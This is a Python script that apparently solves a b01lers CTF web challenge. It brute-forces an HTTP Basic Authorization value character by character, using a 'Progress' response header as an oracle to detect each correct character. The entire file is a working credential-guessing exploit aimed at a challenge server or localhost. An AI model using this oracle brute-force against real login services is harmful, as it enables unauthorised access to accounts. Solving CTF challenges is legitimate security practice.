#!/usr/bin/env python3

import requests
import sys
import base64

url = 'http://web.ctf.b01lers.com:1005'
url = 'http://localhost:1005'

# Number of requests
num_requests = 0

# Username from alien_tech.wasm
flag = b'N Gonzalez'

# Last 'Progress' header value
last_index = 1

# Printable ascii from 0x20 to 0x7E
current_char_int = 0x20

# Brute force the authorization
while True:
    # Unprintable characters
    if current_char_int > 0x7E:
        print('\nUh oh, broke')
        sys.exit(1)

    # Create guess for the authorization
    guess = flag + chr(current_char_int).encode('ascii')

    # Base64 because that's how http basic authentication works
    guess_b64 = base64.b64encode(guess)

    # Print out progress
    print('\r' + guess.decode('utf-8'), end='')

    # Request the page, only need headers, so use HEAD instead of GET
    headers = {b'Authorization': b'Basic ' + guess_b64}
    response = requests.head(url, headers=headers)
    num_requests += 1

    # We're authenticated if we get a 200
    if response.status_code == 200:
        # Add the last character we tried to the flag
        flag += chr(current_char_int).encode('ascii')
        break

    try:
        # Get oracle-esque header
        current_index = int(response.headers['Progress'])
    except KeyError:
        pass

    # Found character
    if current_index != last_index:
        # Append to flag
        flag += chr(current_char_int).encode('ascii')
        # Reset current character
        current_char_int = 0x20
        # Update index
        last_index = current_index

    # Print out progress
    print('\r' + guess.decode('utf-8'), end='')

    # Increment current character
    current_char_int += 1

# Print final flag and total requests
print('\r' + flag.decode('utf-8') + '\nIn ' + str(num_requests) + ' requests')
